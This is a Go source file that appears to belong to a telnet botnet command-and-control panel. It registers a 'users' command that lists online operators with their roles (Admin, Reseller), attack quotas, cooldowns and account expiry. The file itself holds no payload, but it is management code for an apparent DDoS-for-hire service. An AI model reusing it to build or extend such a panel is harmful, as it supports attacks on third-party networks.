package subcommands

import (
	"advanced-telnet-cnc/packages/format"
	"advanced-telnet-cnc/packages/simpletable"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"fmt"
	"strings"
)

func init() {
	command.Subcommand("users", &command.SubCommand{
		Aliases: []string{"sessions", "online"},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Role"},
					{Align: simpletable.AlignCenter, Text: "Time"},
					{Align: simpletable.AlignCenter, Text: "Cool"},
					{Align: simpletable.AlignCenter, Text: "Attacks"},
					{Align: simpletable.AlignCenter, Text: "Expiry"},
					{Align: simpletable.AlignCenter, Text: "Session"},
				},
			}

			for i, profile := range sessions.Clone() {
				left, max, err := profile.Attacks()
				if err != nil {
					return err
				}

				role := "User"
				if profile.Admin {
					role = "\x1b[91mAdmin"
				} else if profile.Reseller {
					role = "\x1b[95mReseller"
				}

				usageSymbol := ""
				if winterTemp(max, left, 30) {
					usageSymbol = "\u001B[93m⚠ "
				}

				r := []*simpletable.Cell{
					{Text: fmt.Sprintf("%d", i+1)},
					{Text: usageSymbol + profile.Name},
					{Text: role},
					{Text: fmt.Sprintf("%ds", profile.MaxTime)},
					{Text: fmt.Sprintf("%ds", profile.Cooldown)},
					{Text: fmt.Sprintf("%d/%d", left, max)},
					{Text: format.Format(profile.Expiry)},
					{Text: format.Format(profile.Created)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
			}

			table.SetStyle(simpletable.StyleCompactLite)
			session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
			return session.Println(" \x1b[91mAdmin\x1b[0m | \x1b[95mReseller\x1b[0m | \x1b[93m⚠ \x1b[0mHigh Usage")
		},
	})
}
